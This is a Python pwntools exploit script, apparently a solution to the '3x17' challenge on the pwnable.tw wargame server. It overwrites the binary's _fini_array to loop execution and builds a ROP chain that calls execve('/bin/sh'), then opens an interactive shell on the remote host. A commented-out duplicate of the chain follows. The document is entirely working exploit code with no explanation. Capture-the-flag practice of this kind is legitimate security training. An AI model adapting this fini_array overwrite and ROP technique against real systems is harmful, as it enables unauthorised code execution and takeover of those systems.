from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./3x17')
else:
	p = remote('chall.pwnable.tw', 10105)

#gdb.attach(p)
p.recvuntil('addr:')
p.send(str(0x4b40f0))
p.recvuntil('data:')
p.send(p64(0x402960) + p64(0x401B6D))
#rop_chain
pop_rdi=0x401696
pop_rax=0x41e4af
pop_rdx_rsi=0x44a309
bin_sh_addr=0x4b4140
p.sendlineafter("addr:",str(0x4b4100))
p.sendafter("data:",p64(pop_rdi))
p.sendlineafter("addr:",str(0x4b4108))
p.sendafter("data:",p64(bin_sh_addr)+p64(pop_rax)+p64(0x3b))
p.sendlineafter("addr:",str(0x4b4120))
p.sendafter("data:",p64(pop_rdx_rsi)+p64(0)+p64(0))
p.sendlineafter("addr:",str(0x4b4138))
p.sendafter("data:",p64(0x446e2c)+"/bin/sh\x00")

#get_shell
p.sendlineafter("addr:",str(0x4b40f0))
p.sendafter("data:",p64(0x401c4b))
p.interactive()

'''
#_fini_array
p.sendlineafter("addr:",str(0x4b40f0))
p.sendafter("data:",p64(0x402960)+p64(0x401b6d))

#rop_chain
pop_rdi=0x401696
pop_rax=0x41e4af
pop_rdx_rsi=0x44a309
bin_sh_addr=0x4b4140
p.sendlineafter("addr:",str(0x4b4100))
p.sendafter("data:",p64(pop_rdi))
p.sendlineafter("addr:",str(0x4b4108))
p.sendafter("data:",p64(bin_sh_addr)+p64(pop_rax)+p64(0x3b))
p.sendlineafter("addr:",str(0x4b4120))
p.sendafter("data:",p64(pop_rdx_rsi)+p64(0)+p64(0))
p.sendlineafter("addr:",str(0x4b4138))
p.sendafter("data:",p64(0x446e2c)+"/bin/sh\x00")

#get_shell
p.sendlineafter("addr:",str(0x4b40f0))
p.sendafter("data:",p64(0x401c4b))
p.interactive()
'''
